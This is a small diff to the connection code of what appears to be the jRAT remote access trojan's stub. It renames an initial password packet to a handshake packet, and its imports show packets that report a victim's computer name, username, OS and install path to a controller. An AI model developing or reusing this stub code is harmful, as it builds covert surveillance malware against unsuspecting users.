@@ -12,7 +12,7 @@ import io.jrat.stub.packets.outgoing.Packet13Status;
 import io.jrat.stub.packets.outgoing.Packet14InitComputerName;
 import io.jrat.stub.packets.outgoing.Packet15InitServerID;
 import io.jrat.stub.packets.outgoing.Packet16InitOperatingSystem;
-import io.jrat.stub.packets.outgoing.Packet1InitPassword;
+import io.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import io.jrat.stub.packets.outgoing.Packet22InitUsername;
 import io.jrat.stub.packets.outgoing.Packet23InitInstallPath;
 import io.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
@@ -80,7 +80,7 @@ public class Connection implements Runnable {
 
 			Main.encryption = inputStream.read() == 1;
 
-			addToSendQueue(new Packet1InitPassword(Main.getPass()));
+			addToSendQueue(new Packet1InitHandshake());
 
 			initialize();
 
